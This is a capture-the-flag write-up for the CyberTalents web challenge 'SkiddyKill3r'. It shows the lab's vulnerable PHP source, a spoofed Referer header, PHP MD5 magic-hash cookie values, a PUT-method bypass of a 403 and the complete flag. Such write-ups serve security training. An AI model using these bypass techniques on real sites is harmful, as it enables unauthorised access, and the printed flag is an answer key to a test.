---
title: SkiddyKill3r
author: Bonface
date: 2025-10-08 02:54
categories:
  - Challenges
  - CyberTalents
tags:
  - web
  - php-hash-magic
image:
  path: /assets/img/cybertalents.jpg
  alt: cybertalents
---
This writeup details the complete breakdown of the **SkiddyKill3r** web challenge, a rigorous test of reconnaissance and creative problem-solving. The path to the flag required chaining multiple exploits: from **Referer header spoofing** and leveraging a classic **PHP MD5 hash collision** vulnerability, all the way to bypassing a 403 Forbidden error using the **PUT method** to discover a secret **User-Agent** string hidden deep within the server's configuration.


Challenge Description : 
```
Creative Thinking will make getting the flag so much easier
```

We visit the site.
![thesite](https://gist.github.com/user-attachments/assets/b8edd070-3e60-428c-ac40-6e131b1f6c0c)

When we search for a user like `admin` here is the output.
![search](https://gist.github.com/user-attachments/assets/b64a9ee8-0a26-4182-9c06-da1140e7f93b)

The hint is we always read the source code for the page and in the source code we get this comments.

```html

<!-- Your Hint Is admin  To Get Hint Maybe Your Name Or Mine -->
<!-- Momen Is A Good Name Too -->
<!-- Just Try To Brute Them (Manually)-->

```

Searching for `Momen` we get a success .
![momen](https://gist.github.com/user-attachments/assets/2bea7c72-fd73-4d1f-87dc-e713fa3e2d3b)

Now we can visit the page at : `/hint.php`
![hintphp](https://gist.github.com/user-attachments/assets/69f1e5d2-08bc-4fdb-9769-570e7822aa37)

From the hint page we need to add a parameter to the request.
```
/hint.php?show=True
/hint.php?show=False
```

Using the parameter as true : 
![true](https://gist.github.com/user-attachments/assets/a94551b3-8390-47a7-bed5-d1cf94389c9b)

We get a php source code .
```php
<?php

// Our Site Have robots.txt Too

require_once("real_flag.php");

if(isset($_GET['show']) && $_GET['show']==='True')
    show_source(__FILE__);
else
    echo("Parameter is good even it was <b>True</b> or <b>False</b>");


if(isset($_SERVER['HTTP_REFERER']) && $_SERVER['HTTP_REFERER']==='http://cyberguy')
    echo($flag1);
else

    echo("<br>Nothing To <b>show</b> Here !<br>");


if (isset($_COOKIE['flag']) &&  isset($_COOKIE['flag1']))
    {
        if($_COOKIE['flag'] != $_COOKIE['flag1'])
        {
            if(md5($_COOKIE['flag'])==md5($_COOKIE['flag1']))
            {
               echo "$flag2";
             }
        }
    
     }

if (isset($_GET['flag']) && $_GET['flag'] == "HiNt" && isset($_COOKIE['flag']) && $_COOKIE['flag'] == "True"){
    echo $hint;
};


/*
To Get The Final Flag Try To Search About The Right User-Agent And File ;) 
Remember: - The Flag Not Always Exits In What We See
*/
echo "<br><br>";
echo "Your User Agent : - <pre><b>" . htmlspecilachars($_SERVER['HTTP_USER_AGENT']) . "</b></pre> I Think You Need It ;)"  . "\n\n";

?>

```

The first line is commented and tells us about the robots.txt file.
```bash
curl http://cdcamxwl32pue3e6m4m236nlbg301p6v4yk5xix3g-web.cybertalentslabs.com/robots.txt

User-agent: *
Disallow: /
Allow: /index.php
Allow: /flag.php
Allow: /flag1.jpg
Disallow: /robots.txt.php #-> Access Here To Get The Final Flag ;)
```

Lets visit the link pages.
`/index.php`
![indexphp](https://gist.github.com/user-attachments/assets/2f5c4889-5a3e-4501-8c4e-3f55bc089c55)

We get page not found.

`/flag.php`
![flagphp](https://gist.github.com/user-attachments/assets/3411fcb8-3692-44ed-b7d4-a17aae0af7b8)

nothing here also 🤦 and am sure you don't want to visit the `/flag1.jpg`.

Back to the source code review this part picks our interest.
```php
if(isset($_SERVER['HTTP_REFERER']) && $_SERVER['HTTP_REFERER']==='http://cyberguy')
    echo($flag1);
else
```

This means that on out request we should include the `http_referer` header and pass `http://cyberguy` as its parameter.

```
Referer: http://cyberguy
```

Sending the request we get the first part of the flag.
![flagp1](https://gist.github.com/user-attachments/assets/8f8b0be6-2981-44cb-91ae-6498a68b196f)

flag1 = `0xL4ugh{H3r0_`

For flag two we have to satisfy this conditions.
```php
if (isset($_COOKIE['flag']) &&  isset($_COOKIE['flag1']))
    {
        if($_COOKIE['flag'] != $_COOKIE['flag1'])
        {
            if(md5($_COOKIE['flag'])==md5($_COOKIE['flag1']))
            {
               echo "$flag2";
             }
        }
    
     }
```

we have this .
```
- condition 1
Cookie: flag=
Cookie: flag1=

- condition 2
flag != flag1

- condition 3
md5(flag) == md5(flag1)
```

To satisfy this we use this payload for hash magic
```
Cookie: flag=240610708; flag1=QNKCDZO
```

![flagp2](https://gist.github.com/user-attachments/assets/f1e8b827-c498-4c3f-94c7-094420ba7213)

flag2
```
I5_
```

The next part gives us a hint but we need to satisfy a condition.
```php
if (isset($_GET['flag']) && $_GET['flag'] == "HiNt" && isset($_COOKIE['flag']) && $_COOKIE['flag'] == "True"){
    echo $hint;
}
```

Conditions : 
- get flag parameter
- set the parameter to `HiNt`
- set the Cookie to flag=True

Here is how the request should look like.
```
GET /hint.php?flag=HiNt HTTP1.1
Host: 

Cookie: flag=True
```

Sending the request we get : 
![req](https://gist.github.com/user-attachments/assets/0fbffcdb-0056-4c66-8aa1-b929d5040eb4)


The hint : 
```
Your Hint Is :- Go To _/robots.txt_ You May Find Any Thing Help You
```

Since we had visited all the allowed pages in the robots.txt file, lets try the disallow page which was `robot.txt.php`.
And the hint does tell : 
```
Disallow: /robots.txt.php #-> Access Here To Get The Final Flag ;)
```

Visiting the site we get a 403 error, to bypass this :
- i added the cookie that we used to get flag 2
- and changed the http method to a PUT
![roboto](https://gist.github.com/user-attachments/assets/3f38b8e5-8130-43b5-88f7-1c533977648a)

We get : 
- `/user_check.php` A new page that we couldn't see in the other robots.txt file
- `User Agent :- G3t_My_Fl@g_N0w()` this is crucial for we had some hints pointing to it.
- `/real_flag.php  page now allowed

With this  we can craft a request to the `/real_flag.php` and the `/user_check.php` page and have the user agent set to `G3t_My_Fl@g_N0w()`
![finalflag](https://gist.github.com/user-attachments/assets/fb76749e-91cd-4c34-b494-2eede644161b)

Final flag.
```
0xL4ugh{H3r0_I5_You0_F0r_N0w}
```


